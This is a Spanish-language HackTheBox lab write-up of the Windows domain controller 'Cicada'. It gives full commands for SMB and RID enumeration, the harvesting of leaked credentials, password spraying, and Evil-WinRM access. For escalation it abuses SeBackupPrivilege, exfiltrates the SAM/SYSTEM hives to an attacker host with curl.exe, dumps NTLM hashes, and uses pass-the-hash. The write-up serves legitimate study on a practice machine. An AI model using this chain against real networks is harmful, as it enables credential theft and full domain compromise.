---
icon: windows
tags:
  - smb
  - active-directory
  - sebackupprivilege
---

# Cicada

## Resumen

### Detalles

| Campo                 | Detalle      |
| --------------------- | ------------ |
| **Nombre**            | Cicada       |
| **Sistema Operativo** | Windows      |
| **Plataforma**        | HackTheBox   |
| **Fecha**             | 27/10/2026   |
| **IP Objetivo**       | 10.129.91.25 |

### Executive Summary

La máquina **Cicada** expone un controlador de dominio Windows con Active Directory, SMB y WinRM. La enumeración de SMB permite el acceso como `guest` al recurso `HR`, donde `Notice from HR.txt` expone una credencial sin usuario asociado. Tras enumerar usuarios con RID brute, se confirma que la credencial es válida para `michael.wrightson`. Con esta sesión, `rpcclient querydispinfo` filtra la contraseña de `david.orelious`, cuyo acceso al recurso `DEV` revela `Backup_script.ps1`. El análisis del script expone las credenciales de `emily.oscars`, con las que se obtiene acceso vía Evil-WinRM y la flag de usuario.

Una vez dentro, se comprueba que `emily.oscars` dispone de `SeBackupPrivilege` por pertenencia a `Backup Operators`. Se abusa de este privilegio para volcar los hives `SAM` y `SYSTEM`, extraer el hash NTLM del `Administrator` local con `impacket-secretsdump` y realizar Pass-the-Hash vía Evil-WinRM, obteniendo acceso como Administrator y la flag de root.

### Técnicas

* SMB Enumeration
* RID Brute with Netexec
* Information Leakage through Rpcclient (querydispinfo)
* Abusing `SeBackupPrivilege` \[Privilege Escalation]
* SAM/SYSTEM Hive Dump with `impacket-secretsdump`
* Pass-the-Hash

## Information Gathering

### Port Scanning

#### TCP

```bash
> nmap -Pn -p- -n -vv -oG allPorts 10.129.91.25
> nmap -Pn -n -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,61668 -vv -oG allServices 10.129.91.25
```

| Puerto    | Servicio      | Versión                                                                                       |
| --------- | ------------- | --------------------------------------------------------------------------------------------- |
| 53/tcp    | domain        | Simple DNS Plus                                                                               |
| 88/tcp    | kerberos-sec  | Microsoft Windows Kerberos (server time: 2026-10-27 15:25:26Z)                                |
| 135/tcp   | msrpc         | Microsoft Windows RPC                                                                         |
| 139/tcp   | netbios-ssn   | Microsoft Windows netbios-ssn                                                                 |
| 389/tcp   | ldap          | Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |
| 445/tcp   | microsoft-ds? |                                                                                               |
| 464/tcp   | kpasswd5?     |                                                                                               |
| 593/tcp   | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                                           |
| 636/tcp   | ssl\|ldap     | Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |
| 3268/tcp  | ldap          | Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |
| 3269/tcp  | ssl\|ldap     | Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |
| 5985/tcp  | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP)                                                      |
| 61668/tcp | msrpc         | Microsoft Windows RPC                                                                         |

### Enumeration

#### SMB

**Unauthenticated**

Se procede a enumerar recursos compartidos sin autenticación mediante el usuario `guest`.

```bash
> netexec smb cicada.htb -u 'guest' -p '' --shares
```

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

El usuario `guest` tiene capacidad de leer los recursos: `HR` y `IPC$`

Se procede a listar el contenido del recurso `HR`

```bash
> smbclient '\\10.129.91.25\HR' -U 'guest%'
```

```bash
smb: \> ls
```

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

En el recurso `HR` se encuentra el archivo `Notice from HR.txt`.

Se procede a descargar el archivo `Notice from HR.txt`.

```bash
smb: \> get "Notice from HR.txt"
```

\
En el archivo `Notice from HR.txt` se expone un credencial: `Cicada$M6Corpb*@Lp#nZp!8`, sin un usuario concreto.

<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

Se procede a enumerar usuarios

```bash
> netexec smb cicada.htb -u 'guest' -p '' --rid-brute
```

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

Se logra enumerar los siguientes usuarios:

* `Administrator`
* `john.smoulder`
* `sarah.dantelia`
* `michael.wrightson`
* `david.orelious`
* `emily.oscars`

**Authenticated**

Se procede a enumerar los recursos accesibles para el usuaro `michael.wrightson`.

```bash
> netexec smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

El usuario `michael.wrightson` tiene accesibles los recursos `HR`, `IPC$`, `NETLOGON`, `SYSVOL`

Se procede a enumerar y extraer la información de visualización de todas las cuentas de usuario del dominio

```bash
> rpcclient -U 'cicada.htb/michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.129.91.25 -c 'querydispinfo'
```

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

La descripción del usuario `david.orelious` expone una contraseña. `aRt$Lp#7t*VQ!3`.

Se procede a listar recursivamente el contenido de los recursos accesibles para el usuario `david.orelious`&#x20;

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

El usuario `david.orelious` tiene acceso a leer los recursos: `DEV`, `HR`, `IPC$`, `NETLOGON` y `SYSVOL`. El recurso `DEV` contiene un script llamado `Backup_script.ps1`

## Explotación

### Foothold

* **Vulnerabilidad:** Exposición encadenada de credenciales en recursos SMB y en la descripción de una cuenta de dominio, que permite el acceso inicial como `emily.oscars`.
* **Exploit:** Password spraying controlado contra los usuarios enumerados + conexión vía Evil-WinRM.
* **Procedimiento:**

1. Validar la credencial expuesta en `Notice from HR.txt` contra los usuarios enumerados con RID brute, para identificar la cuenta asociada.

```bash
> netexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

2. Obtener la credencial de `david.orelious` a través de la descripción de su cuenta, usando la sesión de `michael.wrightson`.

```bash
> rpcclient -U 'cicada.htb/michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.129.91.25 -c 'querydispinfo'
```

3. Descargar y analizar `Backup_script.ps1` desde el share `DEV` con la sesión de `david.orelious`, para extraer las credenciales de `emily.oscars`.

```bash
> smbmap -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -H 10.129.91.25 --download "DEV/Backup_script.ps1"
```

4. Conectarse al host vía WinRM con las credenciales de `emily.oscars`.

```bash
> evil-winrm -i 10.129.91.25 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

* **Evidencia:** (`user.txt`)&#x20;

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

### Privesc

* **Vulnerabilidad:** Privilege Escalation via `SeBackupPrivilege` and Registry Hive Extraction
* **Exploit:** Abuso de `SeBackupPrivilege` mediante `reg save` para volcar `SAM`/`SYSTEM`, extracción de hashes con `impacket-secretsdump` y Pass-the-Hash vía Evil-WinRM.
* **Procedimiento:**

1. Se procede a listar los privilegios del usuario `emily.oscars`

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
```

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Se detecta el privilegio `SeBackupPrivilege` .

2. Se crea el directorio `temp` en `C:\`

```bash
> mkdir C:\temp
```

3. Se copian las reglas `sam.hive` y `system.hive` de HKLM a la carpeta `C:\temp`

```powershell
> reg save hklm\sam C:\temp\sam.hive
> reg save hklm\system C:\temp\system.hive
```

4. Se desplega `uploadserver` en el puerto 2000 para llevar estos archivos a la máquina local. Y se cargan con `curl.exe`

```bash
# Local Machine
> pyhton3 -m uploadserver 2000
```

```powershell
# Victim machine (Evil-WinRM)
> curl.exe -X POST http://10.10.15.78:2000/upload -F 'files=@C:\temp\sam.hive' -F 'files=@C:\temp\system.hive'
```

5. Se utiliza `impacket-secretsdump` para obtener NTLM Hashes

```bash
> impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Se obtienen los siguientes hashes

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

6. Se procede con `evil-winrm` a pasar el hash obtenido y realizar conexión como Administrador Local:

```bash
> evil-winrm -i 10.129.91.25 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

Se obtiene sesión como administrador.

* **Evidencia:** (root.txt)&#x20;

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

